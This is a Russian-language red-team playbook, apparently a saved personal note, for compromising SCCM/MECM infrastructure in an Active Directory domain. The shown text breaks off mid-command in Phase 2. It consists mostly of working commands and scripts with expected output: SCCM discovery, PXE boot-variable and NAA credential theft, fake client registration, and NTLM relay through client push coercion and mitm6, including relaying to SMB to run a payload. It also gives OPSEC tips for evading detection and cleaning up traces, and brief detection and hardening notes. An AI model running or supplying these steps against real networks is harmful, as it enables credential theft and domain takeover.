---
id: "3fqyno2dcmqfkfqgv"
title: "SCCM gaid"
tags: []
isFavorite: false
order: 7
createdAt: "2026-06-15T18:47:49.951Z"
updatedAt: "2026-06-15T18:48:21.215Z"
---
SCCM/MECM ATTACK PLAYBOOK
Red Team Operational Guide — AD Environment Full Compromise
ФАЗА 0: ПОДГОТОВКА И РАЗВЕДКА ОКРУЖЕНИЯ
Цель фазы
Определить присутствие и топологию SCCM-инфраструктуры без использования доменных учётных данных.

Предусловия
Сетевой доступ к корпоративной сети (физический/VPN/WiFi)
Attacker box: Linux (Kali/Debian) или Windows
Разрешение на сканирование в RoE
Инструменты
nmap 7.94+
responder (https://github.com/lgandx/Responder)
impacket 0.12+ (https://github.com/fortra/impacket)
SCCMHunter (https://github.com/garrettfoster13/sccmhunter)
crackmapexec / netexec 1.3+
dnsrecon / dnsx
enum4linux-ng
ldapsearch (ldap-utils)
curl / wget
Последовательность действий
Шаг 0.1: Пассивная DNS разведка SCCM-специфичных имён
Что делаем: Ищем стандартные DNS-имена, которые администраторы SCCM создают по умолчанию или по best practice.

Команда:

Bash

# Список типичных SCCM FQDN-паттернов для брутфорса
cat << 'EOF' > sccm_dns_wordlist.txt
sccm
mecm
sms
configmgr
cm
mp
dp
wsus
sup
cas
pxe
sccm-mp
sccm-dp
sccm-srv
configmgr-mp
managementpoint
distributionpoint
softwarecenter
EOF

# DNS брутфорс по домену
for host in $(cat sccm_dns_wordlist.txt); do
    result=$(host ${host}.TARGET.DOMAIN 2>/dev/null | grep "has address")
    if [ -n "$result" ]; then
        echo "[+] FOUND: $result"
    fi
done

# Или через dnsx (быстрее)
dnsx -d TARGET.DOMAIN -w sccm_dns_wordlist.txt -resp -silent
Ожидаемый результат:

text

[+] FOUND: sccm.target.domain has address 10.10.10.50
[+] FOUND: mp.target.domain has address 10.10.10.51
[+] FOUND: dp.target.domain has address 10.10.10.52
Если не работает: Переходи к шагу 0.3 (LDAP SCP lookup) или 0.5 (port scan)

Шаг 0.2: Passive разведка через широковещательный трафик
Что делаем: Запускаем Responder в analyse-only режиме для захвата SCCM-специфичного трафика без активного отравления.

Команда:

Bash

# Analyse mode — только слушаем, не отравляем
sudo responder -I eth0 -A -v 2>&1 | tee responder_passive.log

# Параллельно фильтруем SCCM-специфичный трафик
sudo tcpdump -i eth0 -n '(port 10123 or port 8530 or port 8531 or port 80 or port 443)' \
    -w sccm_traffic.pcap &

# Смотрим на DHCP-опции (PXE)
sudo tcpdump -i eth0 -n 'port 67 or port 68' -v 2>&1 | grep -E "option|next-server|bootfile"
Ожидаемый результат:

text

[Analyse mode: LLMNR] Request from 10.10.10.100 for SCCMSERVER
[Analyse mode: NBT-NS] Request from 10.10.10.101 for MP01
Если не работает: Сеть сегментирована или broadcast подавлен — переходи к активному сканированию.

Шаг 0.3: LDAP разведка SCP без аутентификации
Что делаем: SCCM публикует Service Connection Point в AD. Можно читать без кредов если anonymous bind разрешён (редко, но встречается).

Команда:

Bash

# Anonymous LDAP bind попытка
ldapsearch -x -H ldap://TARGET_DC_IP:389 \
    -b "DC=TARGET,DC=DOMAIN" \
    "(objectClass=mSSMSManagementPoint)" \
    mSSMSCapabilities mSSMSSiteCode mSSMSMPName 2>/dev/null

# Альтернатива — поиск SCP
ldapsearch -x -H ldap://TARGET_DC_IP:389 \
    -b "DC=TARGET,DC=DOMAIN" \
    "(objectClass=serviceConnectionPoint)" \
    keywords serviceBindingInformation 2>/dev/null | grep -i -A5 "sccm\|mecm\|sms\|configmgr"

# Через impacket если NTLM required (null session)
python3 /opt/impacket/examples/ldapdomaindump.py \
    -u '' -p '' \
    TARGET_DC_IP 2>/dev/null
Ожидаемый результат:

text

dn: CN=SMS-MP-S01-SCCMSERVER.TARGET.DOMAIN,CN=System Management,CN=System,DC=TARGET,DC=DOMAIN
mSSMSSiteCode: S01
mSSMSMPName: SCCMSERVER.TARGET.DOMAIN
mSSMSCapabilities: <Capabilities SchemaVersion="1.0">...
Если не работает: Anonymous bind отключён — нужны креды (Фаза 2). Пробуем NBT-NS/mDNS разведку.

Шаг 0.4: NetBIOS/SMB fingerprinting SCCM серверов
Что делаем: Идентифицируем Management Point и Distribution Point через SMB fingerprinting на диапазоне сети.

Команда:

Bash

# Быстрое обнаружение SMB хостов
netexec smb 10.10.10.0/24 --gen-relay-list live_hosts.txt 2>/dev/null

# Fingerprint всех хостов
netexec smb 10.10.10.0/24 2>/dev/null | tee smb_hosts.txt

# Проверяем SCCM-специфичные shares на найденных хостах
for ip in $(cat live_hosts.txt); do
    echo "=== $ip ===" 
    netexec smb $ip -u '' -p '' --shares 2>/dev/null | \
        grep -iE "SMS_DP\$|SCCMContentLib|REMINST|SMS_SITE"
done

# Прямая проверка SCCM shares
smbclient -N -L //10.10.10.50/ 2>/dev/null | grep -iE "SMS|SCCM|DP\$|REMINST"
Ожидаемый результат:

text

SMB  10.10.10.50  445  SCCMSERVER  SMS_DP$            READ
SMB  10.10.10.50  445  SCCMSERVER  SCCMContentLib     NO ACCESS
SMB  10.10.10.50  445  SCCMSERVER  REMINST            READ
Если не работает: Null session заблокирован — используем аутентифицированные проверки в Фазе 2.

Шаг 0.5: Port scan SCCM-специфичных портов
Что делаем: Сканируем стандартные SCCM порты для точной идентификации ролей.

Команда:

Bash

# Targeted port scan на SCCM порты
nmap -sV -sC -p 80,443,445,1433,4022,8530,8531,10123,49152-65535 \
    --open -T4 \
    -oA sccm_portscan \
    10.10.10.0/24

# Быстрая проверка конкретных портов
nmap -p 10123,8530,8531 --open 10.10.10.0/24 -oG - | \
    grep "10123/open\|8530/open\|8531/open"

# Детальный fingerprint найденных MP
nmap -sV -p 80,443,10123 \
    --script http-title,http-headers,http-methods \
    10.10.10.50
Порты и их роли:

text

80/443   → Management Point (HTTP/HTTPS MP)
8530     → WSUS/Software Update Point (HTTP)
8531     → WSUS/Software Update Point (HTTPS)  
10123    → Client Notification (BGB - Background Intelligent Transfer)
1433     → SCCM SQL Server (если на отдельном хосте)
4022     → SQL Server Service Broker
49152+   → WMI dynamic ports
Ожидаемый результат:

text

10.10.10.50:80    open  http    Microsoft IIS/10.0 (SMS Management Point)
10.10.10.50:10123 open  unknown [BGB notification port]
10.10.10.51:8530  open  http    Microsoft IIS/10.0 (WSUS)
Если не работает: Firewall блокирует — проверяем через UDP PXE discovery.

Шаг 0.6: PXE-серверов обнаружение через DHCP/broadcast
Что делаем: Обнаруживаем PXE Distribution Points через broadcast DHCP discover.

Команда:

Bash

# Отправляем DHCP Discover с PXE флагами
sudo nmap -sU -p 67 --script dhcp-discover \
    --script-args 'dhcp-discover.dhcptype=DHCPDISCOVER' \
    --broadcast 10.10.10.255

# Альтернатива через Python
sudo python3 << 'EOF'
import socket, struct, random, time

def build_dhcp_discover():
    xid = random.randint(0, 0xFFFFFFFF)
    mac = b'\xde\xad\xbe\xef\xde\xad'
    
    packet = struct.pack('!BBBBIHHIIII16s64s128s',
        1, 1, 6, 0, xid, 0, 0x8000,
        0, 0, 0, 0,
        mac + b'\x00'*10,
        b'\x00'*64, b'\x00'*128)
    
    # DHCP magic cookie + options
    options = b'\x63\x82\x53\x63'
    options += b'\x35\x01\x01'  # DHCP Discover
    options += b'\x37\x03\x42\x43\x3c'  # Request option 66,67,60
    options += b'\x3c\x09\x50\x58\x45\x43\x6c\x69\x65\x6e\x74'  # PXEClient
    options += b'\xff'
    
    return packet + options

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
sock.settimeout(5)
sock.bind(('', 68))
sock.sendto(build_dhcp_discover(), ('255.255.255.255', 67))

try:
    data, addr = sock.recvfrom(1024)
    print(f"[+] DHCP Response from: {addr[0]}")
    # Parse options 66 (TFTP server) and 67 (bootfile)
    options_data = data[236+4:]  # Skip header + magic cookie
    i = 0
    while i < len(options_data):
        opt_type = options_data[i]
        if opt_type == 255: break
        if opt_type == 0:
            i += 1
            continue
        opt_len = options_data[i+1]
        opt_data = options_data[i+2:i+2+opt_len]
        if opt_type == 66:
            print(f"[+] TFTP Server (Option 66): {opt_data.decode()}")
        elif opt_type == 67:
            print(f"[+] Boot File (Option 67): {opt_data.decode()}")
        i += 2 + opt_len
except socket.timeout:
    print("[-] No PXE response")
EOF
Ожидаемый результат:

text

[+] DHCP Response from: 10.10.10.53
[+] TFTP Server (Option 66): 10.10.10.53
[+] Boot File (Option 67): \SMSBoot\x64\wdsmgfw.efi
Если не работает: PXE не используется или на другом сегменте — пропускаем PXE атаки в Фазе 1.

Шаг 0.7: HTTP/HTTPS fingerprinting Management Point
Что делаем: Проверяем доступность и конфигурацию MP через стандартные endpoints.

Команда:

Bash

# Проверка стандартных SCCM MP endpoints
MP_IP="10.10.10.50"

# MP health check endpoint
curl -s -o /dev/null -w "%{http_code}" http://${MP_IP}/sms_mp/.sms_aut?mplist
curl -s http://${MP_IP}/sms_mp/.sms_aut?mplist | head -50

# Capability endpoint
curl -s "http://${MP_IP}/SMS_MP/.sms_aut?MPCapability&Client=True"

# Проверка AdminService (REST API)
curl -s -o /dev/null -w "%{http_code}" \
    "https://${MP_IP}/AdminService/v1.0/" -k

# CCM_POST endpoint
curl -s -o /dev/null -w "%{http_code}" \
    "http://${MP_IP}/ccm_system/request"

# Проверяем все варианты
for endpoint in \
    "/sms_mp/.sms_aut?mplist" \
    "/sms_mp/.sms_aut?MPCapability" \
    "/ccm_system/request" \
    "/ccm_system_windowsauth/request" \
    "/AdminService/v1.0/" \
    "/AdminService/wmi/" \
    "/SMS_MP/.sms_aut?mplist" \
    "/SMS_DP_SMSPKG$/" \
    "/_wmcs/"; do
    
    code=$(curl -sk -o /dev/null -w "%{http_code}" "http://${MP_IP}${endpoint}")
    echo "[$code] http://${MP_IP}${endpoint}"
done
Ожидаемый результат:

text

[200] http://10.10.10.50/sms_mp/.sms_aut?mplist
[200] http://10.10.10.50/SMS_MP/.sms_aut?MPCapability  
[401] http://10.10.10.50/AdminService/v1.0/
[200] http://10.10.10.50/ccm_system/request
Если не работает: HTTPS с cert pinning или WAF — используем Burp proxy для анализа.

Шаг 0.8: Поиск SCCM в SYSVOL/NETLOGON
Что делаем: Ищем SCCM-связанные скрипты, конфиги и кредentials в публично доступных share'ах.

Команда:

Bash

# Анонимный доступ к SYSVOL
smbclient -N //TARGET_DC_IP/SYSVOL -c 'ls' 2>/dev/null

# Рекурсивный поиск SCCM-артефактов в SYSVOL
smbclient -N //TARGET_DC_IP/SYSVOL -c \
    'recurse ON; ls' 2>/dev/null | \
    grep -iE "\.ps1$|\.bat$|\.cmd$|\.xml$|\.ini$" | \
    grep -iE "sccm|mecm|configmgr|software|deploy|install"

# Монтируем и ищем grep-ом
sudo mount -t cifs //TARGET_DC_IP/SYSVOL /mnt/sysvol -o guest,ro 2>/dev/null
find /mnt/sysvol -type f \( -name "*.ps1" -o -name "*.bat" -o -name "*.xml" \) \
    -exec grep -li "sccm\|password\|NAA\|NetworkAccess\|TSEnv" {} \;
Ожидаемый результат:

text

/mnt/sysvol/TARGET.DOMAIN/scripts/install_sccm_client.bat
/mnt/sysvol/TARGET.DOMAIN/Policies/{GUID}/Machine/Scripts/install.ps1
Если не работает: Null session запрещён — нужны креды для Фазы 2.

OPSEC-заметки
text

РИСКИ ФАЗЫ 0:
[!] nmap сканирование — детектируется IDS/SIEM (Snort/Suricata rules на port scan)
    МИТИГАЦИЯ: --scan-delay 2s --max-rate 10, использовать decoy (-D)
    
[!] DNS брутфорс — логируется в DNS server logs
    МИТИГАЦИЯ: пассивный мониторинг трафика предпочтительнее
    
[!] DHCP Discover — виден в DHCP server logs
    МИТИГАЦИЯ: минимальное количество запросов
    
[!] SMB null sessions — Event ID 4625 (anonymous logon)
    МИТИГАЦИЯ: только точечные проверки на подозрительных IP
    
БЕЗОПАСНЫЕ ДЕЙСТВИЯ:
[+] Пассивный tcpdump/responder в A-режиме — не генерирует трафика
[+] HTTP fingerprinting одного endpoint выглядит как легитимный клиент
[+] DNS lookup одного имени — нормальный трафик
Pivot-точки
text

Фаза 0 → Фаза 1:
├── Найден PXE сервер (шаг 0.6) → Шаг 1.1 (PXE Boot Attack)
├── MP доступен без auth (шаг 0.7, код 200) → Шаг 1.3 (HTTP MP policy)  
├── REMINST share доступен (шаг 0.4) → Шаг 1.2 (PXE Media attack)
└── SYSVOL содержит SCCM скрипты (шаг 0.8) → немедленный анализ кредов
Decision Tree Фазы 0
text

PXE обнаружен? 
├── ДА → Фаза 1, Шаг 1.1
└── НЕТ → пропуск PXE шагов

HTTP MP доступен (200)?
├── ДА → Фаза 1, Шаг 1.3-1.4
└── НЕТ → Фаза 1, Шаг 1.5 (relay атаки)

SCCM в SYSVOL?
├── ДА → Немедленный grep на credentials → Фаза 2 с кредами
└── НЕТ → продолжение Фазы 1
Защитные меры (для отчёта)
text

DETECTION:
- Мониторинг DNS запросов к sccm/mp/dp именам из нехарактерных источников
- Алерт на SMB null sessions (Event ID 4625 с анонимным входом)  
- IDS правила на сканирование портов 10123, 8530, 8531
- Отключить null sessions: RestrictAnonymous=2 в GPO

HARDENING:
- Блокировать анонимный LDAP bind на DC
- Скрыть SCP из публичного AD (ограничить права чтения CN=System Management)
- Требовать HTTPS для всех MP соединений
- Отключить DHCP option 66/67 если PXE не используется
ФАЗА 1: АТАКИ БЕЗ КРЕДОВ (Unauthenticated)
Цель фазы
Получить credentials или сетевой доступ используя исключительно unauthenticated векторы атаки SCCM.

Предусловия
Завершена Фаза 0: идентифицированы IP адреса MP, DP, PXE серверов
Сетевой доступ к SCCM инфраструктуре
Root/SYSTEM на attacker box (для raw socket операций)
Инструменты
PXEThief (https://github.com/MWR-CyberSec/PXEThief)
pxethief.py / pxethiefy
impacket — ntlmrelayx.py, smbserver.py
responder 3.1+
SharpSCCM (https://github.com/Mayyhem/SharpSCCM)
sccmwtf (https://github.com/xpn/sccmwtf)
PowerSCCM (https://github.com/PowerShellMafia/PowerSCCM)
mitm6 (для IPv6 DHCP атак)
Последовательность действий
Шаг 1.1: PXE Boot атака — перехват переменных Task Sequence
Что делаем: Запрашиваем PXE boot файлы и извлекаем Variables.dat из media, который может содержать зашифрованные/открытые credentials (NAA, domain join account, local admin пароль).

Версионность: Работает на всех версиях SCCM CB если PXE не защищён паролем.

Конфигурационный флаг: Require a password when computers use PXE — если включён, нужен пароль (шаг 1.1b).

Команда:

Bash

# === МЕТОД 1: PXEThief (Python) ===
# Установка
git clone https://github.com/MWR-CyberSec/PXEThief
cd PXEThief
pip3 install -r requirements.txt

# Запуск: получаем variables.dat через TFTP
sudo python3 pxethief.py 2 10.10.10.53
# Аргумент 2 = использовать конкретный PXE сервер IP

# Или автоматический режим (broadcast)
sudo python3 pxethief.py 1
# Аргумент 1 = DHCP broadcast mode

# === МЕТОД 2: Ручное получение через TFTP ===
# Сначала получаем boot info через BINL/DHCP
# Потом скачиваем variables
tftp 10.10.10.53
> binary
> get \SMSTemp\{GUID}.{GUID}.boot.var variables.dat
> quit

# Или через Python TFTP
python3 -c "
import tftpy
client = tftpy.TftpClient('10.10.10.53', 69)
client.download(r'\SMSTemp\{GUID}.{GUID}.boot.var', 'variables.dat')
"

# === МЕТОД 3: sccmwtf от xpn ===
git clone https://github.com/xpn/sccmwtf
python3 sccmwtf.py variable <PXE_SERVER_IP> <TFTP_PATH>
Расшифровка variables.dat:

Bash

# PXEThief автоматически дешифрует если нет пароля
# Вывод будет содержать:
# _SMSTSReserved1-000 → ENCRYPTED_CRED
# OSDLocalAdminPassword → local admin password
# OSDDomainName → domain
# OSDDomainOUName → OU
# OSDJoinAccount → domain join account  
# OSDJoinPassword → domain join password
# _SMSTSRunFromDP → DP path
# SMSTSNAAPolicyID → NAA policy reference

# Ручной дешифр если PXEThief не справился
python3 << 'EOF'
import struct, hashlib
from Crypto.Cipher import DES3

def decrypt_variables(data):
    # SCCM использует 3DES с ключом из machine GUID
    # Логика дешифра из PXEThief
    pass
EOF
Ожидаемый результат:

text

[*] Received DHCP response from 10.10.10.53
[*] Retrieved boot media variables file
[*] Decrypting variables...
[+] _SMSTSMP: http://sccm.target.domain
[+] SMSTSMediaPFX: <certificate>
[+] OSDJoinAccount: TARGET\svc_domainjoin
[+] OSDJoinPassword: P@ssw0rd123!
[+] NAA: TARGET\svc_naa:SecretPassword!
Если не работает: PXE требует пароль → переходи к Шагу 1.1b или Шагу 1.3.

Шаг 1.1b: PXE с паролем — bruteforce через media
Что делаем: Если PXE защищён паролем — атакуем через offline brute если получили зашифрованный variables.dat.

Версионность: Уязвимость в слабом шифровании — SCCM до 2107 уязвим.

Команда:

Bash

# Получаем зашифрованный файл даже с паролем
sudo python3 pxethief.py 2 10.10.10.53 --save-encrypted encrypted_vars.dat

# PXEThief bruteforce режим
python3 pxethief.py 4 encrypted_vars.dat /usr/share/wordlists/rockyou.txt

# Hashcat режим для PXE переменных (если hash извлечён)
# Тип хэша зависит от версии SCCM
hashcat -m 19850 pxe_hash.txt /usr/share/wordlists/rockyou.txt
Ожидаемый результат:

text

[+] Password found: Password123
[+] Decrypting with found password...
[+] OSDJoinPassword: DomainJoin2024!
Шаг 1.2: PXE Media без пароля — получение сетевого доступа
Что делаем: Загружаемся с PXE напрямую (или через виртуальную машину) для получения доступа к Task Sequence и среде WinPE с сетевым доступом под NAA account.

Команда:

Bash

# На attacker machine настраиваем DHCP relay если в другом сегменте
# ИЛИ используем VM в том же сегменте

# Подключаемся к TFTP и скачиваем полный WinPE
tftp 10.10.10.53 <<EOF
binary
get \Boot\x64\Images\LiteTouchPE_x64.wim litetouch.wim
EOF

# Из WinPE среды: доступ к TS variables
# (если загрузились через PXE)
cmd.exe /c set | findstr -i "SMSTS\|OSD\|_SMS\|NAA"

# Чтение переменных через WMI в WinPE
wmic /namespace:\\root\ccm\SoftMgmtAgent path CCM_TSEnvironment get * /value

# Доступ к TS vars через скрипт в WinPE
cscript.exe << 'EOF'
Set oEnv = CreateObject("Microsoft.SMS.TSEnvironment")
WScript.Echo "NAA: " & oEnv("SMSTSNetworkAccessAccount")
WScript.Echo "JoinUser: " & oEnv("OSDJoinAccount") 
WScript.Echo "JoinPass: " & oEnv("OSDJoinPassword")
EOF
Ожидаемый результат:

text

SMSTSNetworkAccessAccount=TARGET\svc_naa
SMSTSNetworkAccessPassword=NAA_P@ssword!
OSDJoinAccount=TARGET\svc_domainjoin  
OSDLocalAdminPassword=LocalAdmin123!
Шаг 1.3: HTTP Management Point — получение политик без аутентификации
Что делаем: Запрашиваем machine policy от MP используя fabricated/random GUID. В некоторых конфигурациях MP выдаёт обфусцированные но дешифруемые политики.

Конфигурационный флаг: Allow clients to use unencrypted HTTP — должен быть включён. Стандарт для CB ≤ 2103 без eHTTP.

Версионность: До SCCM CB 2103 — HTTP MP без Enhanced HTTP. После 2103 требует Enhanced HTTP или PKI cert.

Команда:

Bash

# === Метод 1: sccmwtf (xpn) — полная unauthenticated NAA атака ===
python3 sccmwtf.py naa http://10.10.10.50

# === Метод 2: Ручной запрос политик от MP ===
MP="10.10.10.50"
SITE_CODE="S01"

# Генерируем случайный GUID клиента
CLIENT_GUID=$(python3 -c "import uuid; print(str(uuid.uuid4()).upper())")

# Запрос списка MP
curl -s "http://${MP}/SMS_MP/.sms_aut?mplist" \
    -H "User-Agent: CCM-SA" | head -100

# Запрос политик (unauth) — тело запроса 
curl -s -X POST "http://${MP}/ccm_system/request" \
    -H "Content-Type: application/octet-stream" \
    -H "CCMClientID: GUID:${CLIENT_GUID}" \
    -H "CCMClientTimestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)" \
    --data-binary @policy_request.bin \
    -o policy_response.bin

# === Метод 3: SharpSCCM — если запускаем на Windows машине в сети ===
# На Windows attacker box или скомпрометированной машине
SharpSCCM.exe get naa -mp "http://10.10.10.50" -sc "S01"

# Метод 4: PowerSCCM
Import-Module .\PowerSCCM.ps1
Get-SCCMNAACredentials -ManagementPoint "http://10.10.10.50" -SiteCode "S01"
Ожидаемый результат:

text

[*] Sending policy request to http://10.10.10.50
[*] Received policy response  
[+] Decoding NAA policy...
[+] NetworkAccessUsername: TARGET\svc_naa
[+] NetworkAccessPassword: NAASecret2024!
Если не работает: Enhanced HTTP включён → нужен cert или креды → Фаза 2.

Шаг 1.4: Network Access Account (NAA) credential harvesting
Что делаем: Регистрируем поддельный SCCM клиент и запрашиваем machine policy включая NAA credentials. NAA используется для аутентификации на DP и часто имеет избыточные привилегии.

Версионность: Работает на CB ≤ 2107 без Enhanced HTTP. С eHTTP — требует self-signed cert (возможно в CB 2103+).

Команда:

Bash

# === sccmwtf — основной инструмент для этой атаки ===
git clone https://github.com/xpn/sccmwtf
cd sccmwtf
pip3 install -r requirements.txt

# Регистрируем fake клиента и получаем NAA
python3 sccmwtf.py naa http://MANAGEMENT_POINT_FQDN SITECODE

# Расширенный вариант с указанием сертификата
python3 sccmwtf.py naa http://sccm.target.domain S01

# === SharpSCCM (Windows) — аутентифицированная регистрация ===
# Этот метод требует минимально корректного TLS контекста
SharpSCCM.exe get naa -mp sccm.target.domain -sc S01

# === Ручная реализация ===
# Шаг 1: Регистрируем клиента
python3 << 'EOF'
import requests, uuid, xml.etree.ElementTree as ET
from datetime import datetime

MP = "http://10.10.10.50"
SITE = "S01"
CLIENT_GUID = str(uuid.uuid4()).upper()

# Registration request
reg_body = f"""<DDR>
  <ClientGUID>{CLIENT_GUID}</ClientGUID>
  <ADSiteName></ADSiteName>
  <SiteCode>{SITE}</SiteCode>
</DDR>"""

headers = {
    "Content-Type": "text/xml; charset=UTF-8",
    "CCMClientID": f"GUID:{CLIENT_GUID}",
    "CCMClientTimestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"),
    "User-Agent": "CCM-SA"
}

# Запрос политики
resp = requests.post(f"{MP}/ccm_system/request", 
                     headers=headers, 
                     data=reg_body, 
                     verify=False)
print(f"[*] Response: {resp.status_code}")
print(resp.content[:500])
EOF
Ожидаемый результат:

text

[*] Registering fake SCCM client with GUID: {E7B3F2A1-...}
[*] Client registered successfully
[*] Requesting machine policy...
[*] Policy received, extracting NAA...
[+] NetworkAccessAccount: TARGET\svc_naa
[+] NetworkAccessPassword: P@ssw0rd!NAA
[+] PolicyID: {Policy-GUID}
Если не работает: eHTTP или PKI required → используй SharpSCCM с machine cert в Фазе 2.

Шаг 1.5: NTLM Relay от SCCM клиентов через Client Push Coercion
Что делаем: Заставляем Management Point инициировать SMB подключение к нашей машине через механизм Client Push (automatic client installation). Релеим NTLM auth MP → LDAP/SMB.

Конфигурационный флаг: Automatic site-wide client push installation — должен быть включён.

Команда:

Bash

# === ТЕРМИНАЛ 1: ntlmrelayx — ждём входящих соединений ===
# Цель: релеим к LDAP DC для создания computer account или shadow creds
python3 /opt/impacket/examples/ntlmrelayx.py \
    -t ldap://DC_IP \
    --no-smb-server \
    --http-port 8080 \
    -smb2support \
    --delegate-access \
    --escalate-user VICTIM_COMPUTER\$ 

# ИЛИ релеим к SMB для exec
python3 /opt/impacket/examples/ntlmrelayx.py \
    -t smb://10.10.10.100 \
    -smb2support \
    --no-http-server \
    -e /tmp/payload.exe \
    -l /tmp/loot

# === ТЕРМИНАЛ 2: Responder — перехватываем NTLM ===
# ОТКЛЮЧАЕМ SMB и HTTP в Responder.conf чтобы не конфликтовать с ntlmrelayx
sudo sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

sudo responder -I eth0 -wv

# === ТЕРМИНАЛ 3: Coercion — принуждаем MP подключиться к нам ===
# Метод A: SCCMHunter client push trigger (требует базовой сетевой позиции)
python3 sccmhunter.py clientpush -mp sccm.target.domain -t ATTACKER_IP

# Метод B: Если есть доступ к AdminService (частично auth)
curl -k -u "TARGET\low_priv_user:password" \
    "https://sccm.target.domain/AdminService/wmi/SMS_Client" \
    -X POST \
    -H "Content-Type: application/json" \
    -d "{\"ClientGUID\":\"ATTACKER_IP\"}"

# Метод C: Создаём новый компьютер в AD с нашим IP как hostname
# Тогда Client Push автоматически попробует подключиться
python3 /opt/impacket/examples/addcomputer.py \
    -computer-name FAKECLIENT \
    -computer-pass 'Password123!' \
    -dc-ip DC_IP \
    TARGET.DOMAIN/lowpriv_user:password

# Меняем DNS запись FAKECLIENT на наш IP
python3 /opt/impacket/examples/dnstool.py \
    -u "TARGET\lowpriv_user" \
    -p "password" \
    -r FAKECLIENT \
    -a add \
    -d ATTACKER_IP \
    DC_IP

# Client Push попробует SMB на ATTACKER_IP → relay!
Ожидаемый результат:

text

[*] SMBD: Received connection from 10.10.10.50 (SCCM Management Point)
[*] Authenticating against ldap://10.10.10.1 as TARGET\SCCMSERVER$
[*] SCCMSERVER$ has privilege to delegate to FAKECLIENT$
[+] Shadow credentials added to FAKECLIENT$
[+] PKCE certificate saved to /tmp/fakeclient.pfx
Если не работает: Client Push не настроен → переходи к Шагу 1.6 (HTTP relay) или Фазе 2.

Шаг 1.6: SCCM HTTP Management Point NTLM relay
Что делаем: Если MP принимает Windows Auth (NTLM) — relay входящих соединений клиентов через attacker-in-the-middle позицию.

Команда:

Bash

# === ТЕРМИНАЛ 1: mitm6 для IPv6 DHCP poisoning → получаем NTLM auth ===
sudo python3 /opt/mitm6/mitm6.py -d target.domain -i eth0 --ignore-nofqdn

# === ТЕРМИНАЛ 2: ntlmrelayx с WPAD/HTTP relay ===
python3 ntlmrelayx.py \
    -6 \
    -t https://sccm.target.domain/AdminService/v1.0/Device \
    -smb2support \
    --no-smb-server \
    -wh ATTACKER_IP \
    --delegate-access

# Если цель — MP NTLM auth
python3 ntlmrelayx.py \
    -t http://sccm.target.domain/ccm_system_windowsauth/request \
    -smb2support \
    --http-port 80 \
    --no-smb-server

# === Responder для дополнительного перехвата ===
sudo responder -I eth0 -wdv \
    --lm \
    --disable-ess
Ожидаемый результат:

text

[*] [IPv6] Poisoned answer sent to fe80::1 for name wpad.target.domain
[*] Authenticating against http://sccm.target.domain as TARGET\user
[+] Relay successful! AdminService accessible
OPSEC-заметки
text

РИСКИ ФАЗЫ 1:
[!] PXEThief генерирует нестандартный DHCP/TFTP трафик
    МИТИГАЦИЯ: один запрос, быстро, с легитимным MAC
    
[!] Fake client registration → Event в SCCM DB (SMS_StatusMessage)
    МИТИГАЦИЯ: удали fake клиента через AdminService после атаки
    
[!] ntlmrelayx + responder — заметны в сети
    МИТИГАЦИЯ: минимальное время активности, точечная цель
    
[!] Client Push coercion → Event 7045 на SCCM сервере
    МИТИГАЦИЯ: использовать медленный poll, не flood
    
[!] mitm6 — IPv6 трафик нетипичен если не используется
    МИТИГАЦИЯ: проверь что IPv6 активен в сети перед запуском
Pivot-точки
text

Получены NAA creds → Фаза 2 с доменными кредами
Получены Domain Join creds → Фаза 2 с привилегированными кредами
NTLM relay успешен → shadow creds / RBCD → Фаза 3
MP политики доступны без auth → Фаза 2 Шаг 2.7 (расширенный harvesting)
Decision Tree Фазы 1
text

PXE доступен без пароля?
├── ДА → Шаг 1.1 → получаем NAA/OSD creds → Фаза 2
└── НЕТ → Шаг 1.1b (bruteforce) или Шаг 1.3

HTTP MP (200 без auth)?
├── ДА → Шаг 1.3 + 1.4 → NAA harvesting
└── НЕТ → eHTTP/PKI → пропускаем, идём в Фазу 2

Client Push включён?
├── ДА → Шаг 1.5 → NTLM relay → shadow creds
└── НЕТ → Шаг 1.6 или Фаза 2

Все unauthenticated векторы провалились?
└── ДА → Фаза 2 (нужны доменные кредентиалы)
Защитные меры (для отчёта)
text

DETECTION:
- Алерт на DHCP requests с PXE флагом от нестандартных MAC
- Мониторинг нового SCCM клиента с нехарактерным GUID (SCCM console)
- IDS: детект sccmwtf HTTP паттернов
- Windows Defender AV: детект PXEThief сигнатур
- Event ID 100/200 в SCCM status messages — незарегистрированные клиенты

HARDENING:
- Включить "Require password for PXE" 
- Мигрировать на Enhanced HTTP (eHTTP) или PKI
- Отключить Automatic Client Push, использовать manual или логон скрипты
- Ротировать NAA credentials регулярно
- Использовать разные NAA credentials для разных DP
- Минимальные права для NAA account (только чтение DP share)
ФАЗА 2: С ДОМЕННЫМИ КРЕДАМИ (Domain User → разведка и credential harvesting)
Цель фазы
Используя доменные credentials провести полную разведку SCCM иерархии и извлечь дополнительные секреты.

Предусловия
Любые валидные доменные credentials (из Фазы 1 или initial foothold)
Сетевой доступ к DC и SCCM серверам
Windows или Linux attacker box
Инструменты
SCCMHunter (https://github.com/garrettfoster13/sccmhunter)
SharpSCCM (https://github.com/Mayyhem/SharpSCCM)
BloodHound 4.3+ с azurehound/sharphound
ldapdomaindump / ldapsearch
impacket — secretsdump, GetUserSPNs, smbclient
mimikatz / pypykatz
PowerSCCM
netexec / crackmapexec
Последовательность действий
Шаг 2.1: LDAP enumeration — поиск SCCM SCP и объектов в AD
Что делаем: С доменными кредами извлекаем полную информацию о SCCM из AD.

Команда:

Bash

# === С Linux через ldapsearch ===
DOMAIN="TARGET.DOMAIN"
DC="10.10.10.1"
USER="lowpriv_user"
PASS="Password123!"

# Поиск Service Connection Point SCCM
ldapsearch -x -H ldap://${DC} \
    -D "${USER}@${DOMAIN}" \
    -w "${PASS}" \
    -b "DC=TARGET,DC=DOMAIN" \
    "(objectClass=mSSMSManagementPoint)" \
    mSSMSSiteCode mSSMSMPName mSSMSCapabilities mSSMSDefaultMP \
    2>/dev/null

# Поиск SCP (System Management container)
ldapsearch -x -H ldap://${DC} \
    -D "${USER}@${DOMAIN}" \
    -w "${PASS}" \
    -b "CN=System Management,CN=System,DC=TARGET,DC=DOMAIN" \
    "(objectClass=*)" \
    * \
    2>/dev/null

# Поиск SCCM server accounts (machine accounts)
ldapsearch -x -H ldap://${DC} \
